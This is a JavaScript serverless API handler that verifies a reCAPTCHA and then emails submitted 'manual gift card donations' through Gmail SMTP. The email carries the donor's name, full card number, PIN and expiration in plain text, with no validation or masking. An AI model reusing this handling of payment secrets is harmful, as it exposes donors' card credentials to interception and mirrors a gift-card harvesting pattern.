// api/manual-donation.js
import nodemailer from "nodemailer";
import axios from "axios";

async function verifyCaptcha(token) {
  const secret = process.env.RECAPTCHA_SECRET_KEY;

  try {
    const res = await axios.post(
      `https://www.google.com/recaptcha/api/siteverify?secret=${secret}&response=${token}`
    );
    console.log("reCAPTCHA verification response:", res.data);
    return res.data.success;
  } catch (error) {
    console.error(
      "Error verifying reCAPTCHA:",
      error.response?.data || error.message
    );
    return false;
  }
}

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const {
    name,
    email,
    cardType,
    cardNumber,
    amount,
    pin,
    expiration,
    captchaToken,
  } = req.body;

  if (!(await verifyCaptcha(captchaToken))) {
    return res.status(400).json({ error: "Captcha verification failed" });
  }

  const message = `
  Manual Gift Card Donation
  ---------------------------
  Name: ${name}
  Email: ${email}
  Card Type: ${cardType}
  Card Number: ${cardNumber}
  Amount: ${amount}
  PIN: ${pin}
  Expiration: ${expiration}
  `;

  try {
    const transporter = nodemailer.createTransport({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: "New Manual Gift Card Donation",
      text: message,
    });

    res
      .status(200)
      .json({ message: "Manual donation email sent successfully" });
  } catch (err) {
    console.error("Error sending manual donation email:", err);
    res.status(500).json({ error: "Failed to send manual donation email" });
  }
}
